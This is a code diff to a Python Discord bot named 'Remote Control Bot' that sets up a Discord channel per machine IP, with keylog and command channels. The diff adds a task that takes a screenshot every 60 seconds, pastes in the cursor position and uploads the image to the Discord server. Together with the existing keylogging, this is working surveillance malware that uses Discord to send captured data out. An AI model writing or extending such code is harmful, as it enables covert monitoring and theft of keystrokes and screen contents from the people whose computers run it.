@@ -310,6 +310,7 @@ async def on_ready():
             category = await guild.create_category(str(ip))
             await guild.create_text_channel("info", category=category)
             await guild.create_text_channel("events", category=category)
+            await guild.create_text_channel("regular-status-update", category=category)
             await guild.create_text_channel("keylog", category=category)
             await guild.create_text_channel("commands", category=category)
 
@@ -435,6 +436,30 @@ async def on_ready():
         if log == "":
             log = "No keys pressed."
         await channel.send(log)
+
+    @tasks.loop(seconds=60)
+    async def regular_status_update():
+        category = nextcord.utils.get(guild.categories, name=str(ip))
+        channel = nextcord.utils.get(category.text_channels, name="regular-status-update")
+
+        screenshot = pyautogui.screenshot()
+
+        x, y = pyautogui.position()
+        final_x = x - cursor_width // 2
+        final_y = y - cursor_height // 2
+        paste_position = (final_x, final_y)
+        screenshot.paste(cursor_image, paste_position, cursor_image)
+        screenshot.save(os.path.join(os.path.abspath(os.path.dirname(__file__)), 'status.png'))
+
+        file = nextcord.File(os.path.join(os.path.abspath(os.path.dirname(__file__)), 'status.png'), filename='status.png')
+        embed = nextcord.Embed(title="Regular status update:", timestamp=datetime.now(), colour=0x808080)
+        embed.set_author(name="Remote Control Bot")
+        embed.set_image(url=f"attachment://status.png")
+        embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")
+
+        if channel:
+            await channel.send(embed=embed, file=file)
+
         
 
     @tasks.loop(seconds=UPDATE_INTERVAL)
@@ -506,6 +531,8 @@ async def on_ready():
     await asyncio.sleep(1)
     update_activity.start()
     update_keylog.start()
+    regular_status_update.start()
+
 
 
 
